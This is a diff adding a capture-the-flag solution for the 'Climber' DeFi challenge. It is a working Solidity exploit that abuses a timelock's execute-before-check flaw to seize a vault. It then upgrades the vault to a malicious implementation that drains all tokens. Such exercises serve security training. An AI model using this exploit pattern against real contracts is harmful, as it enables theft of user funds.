@@ -85,7 +85,9 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        // Deploy the exploit contract
+        Exploit exploit = new Exploit(timelock, address(vault), address(token), recovery);
+        exploit.attack();
     }
 
     /**
@@ -95,4 +97,60 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Exploit {
+    ClimberTimelock timelock;
+    address vault;
+    address token;
+    address recovery;
+
+
+    address[] targets = new address[](4);
+    uint256[] values = [0, 0, 0, 0];
+    bytes[] dataElements = new bytes[](4);
+
+    constructor(ClimberTimelock _timelock, address _vault, address _token, address _recovery) {
+        timelock = _timelock;
+        vault = _vault;
+        token = _token;
+        recovery = _recovery;
+
+        targets = [address(timelock), address(timelock), vault, address(this)];
+        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
+        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", address(this));
+        dataElements[3] = abi.encodeWithSignature("scheduleTimelock()");
+    }
+
+    function attack() public {
+        // Wrap a operation that will setup this contract to be the owner of the Vault
+        // We will exploit the fact that the ClimberTimelock doesn't follow the CEI pattern in the execution function
+        // calling the execute function while altering the state variables to make the operation ready for execution
+        // and then gain ownership of the vault to upgrade it to a malicious version where we can drain the funds
+        timelock.execute(targets, values, dataElements, "");
+        // Now we are the owner of the vault and can upgrade it to a malicious implementation
+        ClimberVault(vault).upgradeToAndCall(address(new maliciousVault()), abi.encodeWithSignature("withdrawAll(address,address)", token, recovery));
+    }
+
+    function scheduleTimelock() public {
+        // Schedule the operation that will make this contract the owner of the vault
+        ClimberTimelock(timelock).schedule(targets, values, dataElements, "");
+    }
+
+}
+
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+contract maliciousVault is ClimberVault {
+
+    // we disable the constructor to avoid the initialization of the implementation by malicious actors
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+        _disableInitializers();
+    }
+
+    function withdrawAll(address token, address recipient) external onlyOwner {
+        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
+    }
+
 }
